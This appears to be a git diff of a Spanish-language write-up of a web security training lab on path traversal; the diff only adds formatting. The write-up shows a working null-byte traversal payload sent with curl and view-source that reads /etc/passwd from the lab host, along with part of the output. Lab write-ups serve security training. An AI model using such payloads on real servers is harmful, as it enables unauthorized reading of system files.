@@ -24,25 +24,25 @@ image:
   
 ## Descripción
 
-Este laboratorio contiene una vulnerabilidad de path traversal en la `visualización de imágenes de productos`. La aplicación valida que el nombre de archivo proporcionado termine con la `extensión de archivo` esperada. Para resolver el laboratorio, hay que obtener el contenido del archivo `/etc/passwd`
+Este `laboratorio` contiene una `vulnerabilidad` de `path traversal` en la `visualización` de `imágenes` de `productos`. La aplicación valida que el `nombre` de `archivo` proporcionado termine con la `extensión` de `archivo` esperada. Para `resolver` el `laboratorio`, hay que `obtener` el contenido del archivo `/etc/passwd`
 
 ---
 
 ## Guía de path traversal
 
-Antes de completar este laboratorio es recomendable leerse esta `guía de path traversal` [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide/)
+`Antes` de `completar` este `laboratorio` es recomendable `leerse` esta `guía de path traversal` [https://justice-reaper.github.io/posts/Path-Traversal-Guide/](https://justice-reaper.github.io/posts/Path-Traversal-Guide/)
 
 ## Resolución
 
-Al acceder a la web nos sale esto
+Al `acceder` a la `web` nos sale esto
 
 ![](/assets/img/Path-Traversal-Lab-6/image_1.png)
 
-Si hacemos `Ctrl + U` vemos como se están cargando las `imágenes`
+Si hacemos `Ctrl + U` vemos como se están `cargando` las `imágenes`
 
 ![](/assets/img/Path-Traversal-Lab-6/image_2.png)
 
-Probamos un directory path traversal usando un null byte, esto sirve para versiones de php que son inferiores a la `5.4`, lo que hacemos es ignorar lo que hay `detrás de %00`
+Probamos un `directory path traversal` usando un `null byte`, esto sirve para `versiones` de `php` que son `inferiores` a la `5.4`, lo que hacemos es `ignorar` lo que hay `detrás` de `%00`
 
 ```
 # curl 'https://0ad5007e0357b4ba813a12ae005e008f.web-security-academy.net/image?filename=../../../../../../../../../../../etc/passwd%00.jpg'     
@@ -89,7 +89,7 @@ pulse:x:116:124:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 gdm:x:117:126:Gnome Display Manager:/var/lib/gdm3:/bin/false
 ```
 
-Si lo queremos hacerlo desde la web debemos poner `view-source://`
+Si lo queremos hacerlo desde la `web` debemos poner `view-source://`
 
 ```
 view-source:https://0aab0027034fa53480d27189009d0038.web-security-academy.net/image?filename=../../../../../../../../../../../etc/passwd%00.jpg
